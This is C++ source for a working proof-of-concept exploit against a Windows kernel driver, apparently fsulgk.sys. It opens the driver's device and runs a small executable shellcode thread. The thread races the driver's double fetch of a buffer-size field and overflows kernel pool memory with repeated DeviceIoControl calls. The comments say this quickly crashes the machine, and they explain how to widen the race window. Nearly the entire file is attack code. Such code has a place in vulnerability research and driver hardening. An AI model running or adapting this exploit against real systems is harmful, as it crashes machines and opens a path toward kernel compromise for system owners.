#include <iostream> 
#include <windows.h>

typedef void(__fastcall* ShellcodeFunctionPtr)(void* Address, UINT16 ValueToChange);

struct ShellcodeParams
{
	ShellcodeFunctionPtr ShellcodeFunc;
	void* AddressToFlip;
	UINT16 ValueToFlip;
};

void* SetupShellcode(BYTE* Shellcode, SIZE_T SizeofShellcode)
{
	void* Result = VirtualAlloc(0, SizeofShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (Result == NULL)
	{
		return nullptr;
	}
	memcpy(Result, Shellcode, SizeofShellcode);
	DWORD OldProtect = 0;
	if (!VirtualProtect(Result, SizeofShellcode, PAGE_EXECUTE_READ, &OldProtect))
	{
		VirtualFree(Result, 0, MEM_RELEASE);
		return nullptr;
	}
	return Result;
}

void CallShellcode(ShellcodeParams* Params)
{
	Params->ShellcodeFunc(Params->AddressToFlip, Params->ValueToFlip);
}

int main()
{
	//Get device handle
	HANDLE DeviceHandle = CreateFileW(L"\\\\.\\FSUlGatekeeperDev", GENERIC_WRITE | GENERIC_READ, FILE_SHARE_WRITE | FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
	std::cout << "Handle: 0x" << std::hex << DeviceHandle << std::endl;
	if (DeviceHandle == INVALID_HANDLE_VALUE)
	{
		std::cout << "Couldn't get DeviceHandle :("
			<< std::endl << "Try to run this exploit with administrator rights"
			<< std::endl << "Press any button to exit...";
		std::getchar();
		return 1;
	}

	//Shellcode which will be flipping buffer size value in input buffer, i use shellcode, to make this code as fast as i can,
	//because compiler may produce slower code (it might depends on optimalization compiler settings)
/*
0:  48 89 c8                mov    rax,rcx
3:  66 89 d3                mov    bx,dx
6							<loop>:
6:  66 31 18                xor    WORD PTR [rax],bx
9:  eb fb                   jmp    6 <loop>
*/
	BYTE ShellCode[] = { 0x48, 0x89, 0xC8, 0x66, 0x89, 0xD3, 0x66, 0x31, 0x18, 0xEB, 0xFB };

	ShellcodeFunctionPtr ShellcodeFunc = (ShellcodeFunctionPtr)SetupShellcode(ShellCode, sizeof(ShellCode));
	if (ShellcodeFunc == nullptr)
	{
		std::cout << "Couldn't setup shellcode :("
			<< std::endl << "Press any button to exit...";
		std::getchar();
		return 1;
	}

	const SIZE_T InputBufferSize = 0x1000; //It can be almost every size
	const SIZE_T RealInputBufferSize = 0x80; //Input buffer size which will be passed to DeviceIoControl
	const SIZE_T BufferSizeToPoolOverflow = InputBufferSize - 0x38; //0x38 is size of some structure, it is probably some sort of header of input buffer
	BYTE* InputBuffer = new BYTE[InputBufferSize];
	//Since exploiting race conditions are cpu depended, then if this exploit doesnt work in your environment, 
	//you can try to make longer that time "window" (time between first and second fetch) 
	//In order to do that it can be used VirtualAlloc with PAGE_NOCACHE (it takes longer to read no cached memory), but in my environment this exploit was working perfectly fine without this
	//BYTE* InputBuffer = (BYTE*)VirtualAlloc(0, InputBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE | PAGE_NOCACHE);
	memset(InputBuffer, 0, 0x38);
	memset(InputBuffer + 0x38, 'A', BufferSizeToPoolOverflow); //Fill buffer which will later overflow pool in kernel
	*(DWORD*)(InputBuffer) = 0x10; //I really dont know what it is, but it has to be 0x10 to execute vulnerable function
	*(DWORD*)(InputBuffer + 0x34) = 1; //It has to be 1, i dont know what it is but it just has to has set 1 bit flag
	*(UINT16*)(InputBuffer + 0x38) = 0x10; //Buffer size, it will be later changed to trigger pool overflow

	//Setup output buffer
	const SIZE_T OutputBufferSize = 0x40;
	BYTE* OutputBuffer = new BYTE[OutputBufferSize];
	memset(OutputBuffer, 0, OutputBufferSize);

	ShellcodeParams Params{ 0 };
	Params.AddressToFlip = InputBuffer + 0x38; //Address of buffer size 
	Params.ShellcodeFunc = ShellcodeFunc; //Set shellcode function
	//I divided that size by 2 because in fsulgk.sys it is later multiplied by 2. I used xor with buffer size because i use xor to flip buffer sizes in shellcode
	Params.ValueToFlip = (BufferSizeToPoolOverflow / 2) ^ *(UINT16*)(InputBuffer + 0x38);

	//Create thread which will be flipping buffer size value
	HANDLE ExploitThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)CallShellcode, &Params, 0, 0);
	if (!ExploitThread)
	{
		std::cout << "Failed to create exploit thread :("
			<< std::endl << "Press any button to exit...";
		std::getchar();
		return 1;
	}

	std::cout << "Exploit is executing..." << std::endl;

	//I use infinite loop because race condition may not be won for the first few calls, it should throw bsod after less few seconds :)
	while (true)
		DeviceIoControl(DeviceHandle, 0xC5EAF047, InputBuffer, RealInputBufferSize, OutputBuffer, OutputBufferSize, 0, 0);
}